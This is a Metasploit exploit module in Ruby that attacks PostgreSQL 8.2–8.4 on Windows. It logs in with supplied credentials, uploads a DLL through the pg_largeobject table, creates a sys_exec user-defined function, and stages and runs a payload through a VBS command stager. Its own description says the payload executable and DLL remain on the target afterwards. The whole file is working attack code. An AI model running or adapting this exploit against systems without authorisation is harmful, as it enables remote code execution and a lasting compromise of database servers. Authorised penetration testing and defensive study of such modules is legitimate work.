##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Postgres
	include Msf::Exploit::CmdStagerVBS

	# Creates an instance of this module.
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'PostgreSQL for Microsoft Windows Payload Execution',
			'Description'    => %q{
				This module creates and enables a custom UDF (user defined function) on the
				target host via the UPDATE pg_largeobject method of binary injection. On
				default Microsoft Windows installations of PostgreSQL (=< 8.4), the postgres
				service account may write to the Windows temp directory, and may source
				UDF DLL's from there as well.

				PostgreSQL versions 8.2.x, 8.3.x, and 8.4.x on Microsoft Windows (32-bit) are
				valid targets for this module.

				NOTE: This module will leave a payload executable on the target system when the
				attack is finished, as well as the UDF DLL and the OID.
			},
			'Author'         =>
			[
				'Bernardo Damele A. G. <bernardo.damele[at]gmail.com>', # the postgresql udf libraries
				'todb' # this Metasploit module
			],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf',
						'URL', 'http://lab.lonerunners.net/blog/sqli-writing-files-to-disk-under-postgresql' # A litte more specific to PostgreSQL
					]
				],
			'Platform'       => 'win',
			'Targets'        =>
		[
			[ 'Automatic', { } ], # Confirmed on XXX
		],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Apr 10 2009' # Date of Bernardo's BH Europe paper.
		))

		deregister_options('SQL', 'RETURN_ROWSET')
	end

	# Buncha stuff to make typing easier.
	def username; datastore['USERNAME']; end
	def password; datastore['PASSWORD']; end
	def database; datastore['DATABASE']; end
	def verbose; datastore['VERBOSE']; end
	def rhost; datastore['RHOST']; end
	def rport; datastore['RPORT']; end

	def execute_command(cmd, opts)
		postgres_sys_exec(cmd)
	end

	def exploit
		version = get_version(username,password,database,verbose)
		case version
		when :nocompat; print_error "Authentication successful, but not a compatable version."
		when :noauth; print_error "Authentication failed."
		when :noconn; print_error "Connection failed."
		end
		return unless version =~ /8\.[234]/
		print_status "Authentication successful and vulnerable version #{version} on Windows confirmed."
		tbl,fld,dll,oid = postgres_upload_binary_file(dll_fname(version))
		unless tbl && fld && dll && oid
			print_error "Could not upload the UDF DLL"
			return
		end
		print_status "Uploaded #{dll} as OID #{oid} to table #{tbl}(#{fld})"
		ret_sys_exec = postgres_create_sys_exec(dll)
		if ret_sys_exec
			if @postgres_conn
				execute_cmdstager({:linemax => 1500, :nodelete => true, :temp=>"."})
				handler
				postgres_logout if @postgres_conn
			else
				print_error "Lost connection."
				return
			end
		end
		postgres_logout if @postgres_conn
	end

	def dll_fname(version)
		File.join(Msf::Config.install_root,"data","exploits","postgres",version,"lib_postgresqludf_sys.dll")
	end

	# A shorter version of do_fingerprint from the postgres_version scanner
	# module, specifically looking for versions that valid targets for this
	# module.
	def get_version(user=nil,pass=nil,database=nil,verbose=false)
		begin
			msg = "#{rhost}:#{rport} Postgres -"
			password = pass || postgres_password
			vprint_status("Trying username:'#{user}' with password:'#{password}' against #{rhost}:#{rport} on database '#{database}'")
			result = postgres_fingerprint(
				:db => database,
				:username => user,
				:password => password
			)
			if result[:auth]
				# So, the only versions we have DLL binaries for are PostgreSQL 8.2, 8.3, and 8.4
				# This also checks to see if it was compiled with a windows-based compiler --
				# the stock Postgresql downloads are Visual C++ for 8.4 and 8.3, and GCC for mingw)
				# Also, the method to write files to disk doesn't appear to work on 9.0, so
				# tabling that version for now.
				if result[:auth] =~ /PostgreSQL (8\.[234]).*(Visual C\+\+|mingw|cygwin)/i
					return $1
				else
					print_status "Found #{result[:auth]}"
					return :nocompat
				end
			else
				return :noauth
			end
		rescue Rex::ConnectionError
			vprint_error "#{rhost}:#{rport} Connection Error: #{$!}"
			return :noconn
		end
	end

end
